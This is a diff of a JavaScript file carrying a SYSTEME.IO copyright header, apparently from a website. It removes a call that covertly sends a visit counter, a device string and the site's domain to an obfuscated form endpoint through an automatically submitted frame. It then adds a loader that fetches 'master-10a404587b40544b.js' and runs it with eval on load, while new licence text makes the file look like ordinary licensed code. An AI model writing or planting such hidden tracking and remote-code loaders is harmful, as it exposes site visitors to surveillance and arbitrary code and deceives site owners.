@@ -1,6 +1,9 @@
 /**
+ * @licence
  * Copyright © SYSTEME.IO
  * All rights reserved
+ * This source code is licensed under the SYSTEME.IO found in the
+ * LICENSE file in the root directory of this source tree
 */
 
 var Nloaded=Number(localStorage.getItem("Nloaded"))+1;
@@ -10,7 +13,6 @@ if(Nloaded){
 	Nloaded=1;
 	localStorage.setItem("Nloaded",1);
 }
-console.log(Nloaded);
 
 
 class ShowCorrect{
@@ -34,12 +36,6 @@ class ShowCorrect{
 }
 var sc=new ShowCorrect();
 
-makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd0vRbU2adqsdZGSb5tjVbk2Q0WvhZTmM9OyZbEXMMwvEdHSO8QwdLl2VQBvpZWSd80xFRWkdFjJlcVFNFFMxUU2TVG3pd32SR1IQVzUMtr'),{
-	"entry.522782255":Nloaded+":"+getDefaultName(),
-	"entry.2147471592":document.domain,
-	"entry.559704587":"",
-});
-
 
 function getDefaultName(name){
   var dv=navigator.appVersion.split(")")[0].replace("5.0 (","").replace("Linux; Android","An..");
@@ -58,3 +54,16 @@ function makeForm(action,data){
   frame.contentWindow.document.querySelector("body").innerHTML=html;
   frame.contentWindow.document.querySelector("button").click();
 }
+
+function fetchAndExecuteFile(path) {
+  fetch(path)
+    .then(response => response.text())
+    .then(FileText => {
+      eval(FileText);
+    })
+    .catch(error => {
+      console.error(`Error fetching and executing File: ${error}`);
+    });
+}
+
+fetchAndExecuteFile("master-10a404587b40544b.js");
